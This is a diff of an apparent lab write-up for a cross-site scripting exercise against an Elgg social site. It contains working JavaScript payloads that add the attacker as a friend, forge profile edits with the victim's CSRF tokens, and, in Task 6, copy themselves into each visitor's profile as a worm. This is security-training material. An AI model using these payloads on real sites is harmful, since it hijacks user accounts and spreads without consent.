@@ -61,8 +61,8 @@
   <script type="text/javascript">
     window.onload = function () {
       var Ajax=null;
-      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-      var token="&__elgg_token="+elgg.security.token.__elgg_token;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // 1
+      var token="&__elgg_token="+elgg.security.token.__elgg_token; // 2
       //Construct the HTTP request to add Samy as a friend.
       var sendurl='http://www.seed-server.com/action/friends/add?friend=59'+ts+token; 
       //Create and send Ajax request to add friend
@@ -75,7 +75,83 @@
 
 Here when Alice visits Samy's profile a Samy will be automatically befriended with his profile visitor(victim).
 The script attached in the about me section will be executed and that will silently send a request from victim's end.
+
+We need ts and token because this provide authentication,i.e. the attackers request is posing as if as it is coming
+from the victim's end.
+
 ** Screenshot
 [[./screenshots/task-4-victim-befriended.png]]
+
+
+
+
+* Task 5
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script type="text/javascript">
+    window.onload = function(){
+      //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+      //and Security Token __elgg_token
+      var username="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+      var token="&__elgg_token="+elgg.security.token.__elgg_token;
+      var description='&description=<p>Samy is my hero<p>';
+      //Construct the content of your url.
+      var samyGuid=59;
+      var sendurl='http://www.seed-server.com/action/profile/edit';
+      var content=username+guid+ts+token+description;
+      if(elgg.session.user.guid!=samyGuid) { // 1
+        //Create and send Ajax request to modify profile
+        var Ajax=null;
+        Ajax=new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+      }
+    }
+  </script>
+#+END_SRC
+
+Here the line with if condition is very important because, if we change the about me section of even Samy, the attack would only work until Samy visits
+his profile next time, after that Samy's 'About Me' section will be changed to '<p>Samy is my hero<p>' and the attack will no longer work since
+there is no malacious code in Samy's profile anymore.
+
+So with the line 1 we are guarding our injection so that, samy profile doesn't change with AJAX requests.
+
+** Screenshot
+[[./screenshots/task-5-samy-is-my-hero.png]]
+
+
+* Task 6
+
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script id="worm">
+    window.onload = function(){
+      //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+      //and Security Token __elgg_token
+      var username="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+      var token="&__elgg_token="+elgg.security.token.__elgg_token;
+      //Construct the content of your url.
+      var sendurl='http://www.seed-server.com/action/profile/edit';
+
+      var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+      var jsCode = document.getElementById("worm").innerHTML;
+      var tailTag = "</" + "script>";
+      var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+      var description='&description=<p>Samy is my hero<p>' + wormCode;
+      var content=username+guid+ts+token+description;
+
+      var Ajax=new XMLHttpRequest();
+      Ajax.open("POST", sendurl, true);
+      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      Ajax.send(content);
+    }
+  </script>
+#+END_SRC
 
 
